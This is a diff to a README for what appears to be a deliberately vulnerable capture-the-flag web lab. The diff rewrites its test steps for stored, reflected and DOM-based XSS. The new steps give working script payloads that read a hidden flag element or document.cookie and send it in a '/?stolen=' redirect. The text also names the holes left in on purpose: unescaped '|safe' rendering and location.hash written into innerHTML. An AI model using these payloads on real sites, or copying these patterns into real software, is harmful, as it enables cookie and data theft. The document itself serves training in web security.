@@ -46,9 +46,9 @@ All flags use the format **`HLMD{...}`**.
 
 **How to test:**
 
-1. **Stored XSS** -- Post a review on any product page with `<img src=x onerror="alert(document.cookie)">`. The comment renders with `|safe`. Reload to execute. Read the `ctf_xss_stored` cookie.
-2. **Reflected XSS** -- Visit `/track/?id=<script>alert(document.cookie)</script>`. The `?id=` value renders with `|safe`. Read the `ctf_xss_reflected` cookie.
-3. **DOM-based XSS** -- Visit `/gallery/#<img src=x onerror="alert(document.cookie)">`. Client-side JS writes `location.hash` into `innerHTML`. Read the `ctf_xss_dom` cookie.
+1. **Stored XSS** -- Post a review on any product page with `<script>document.location='/?stolen='+document.getElementById('ctf-flag').dataset.flag</script>`. The comment renders with `|safe`. Reload to execute. The flag is in a hidden `<div id="ctf-flag" data-flag="FLAG">` element.
+2. **Reflected XSS** -- Visit `/track/?id=<script>document.location='/?stolen='+document.getElementById('ctf-flag').dataset.flag</script>`. The `?id=` value renders with `|safe`. The flag is in a hidden `<div id="ctf-flag" data-flag="FLAG">` element.
+3. **DOM-based XSS** -- Visit `/gallery/#<img src=x onerror="document.location='/?stolen='+document.cookie">`. Client-side JS writes `location.hash` into `innerHTML`. The flag is in the `ctf_xss_dom` cookie (only XSS challenge using cookies).
 
 ---
 
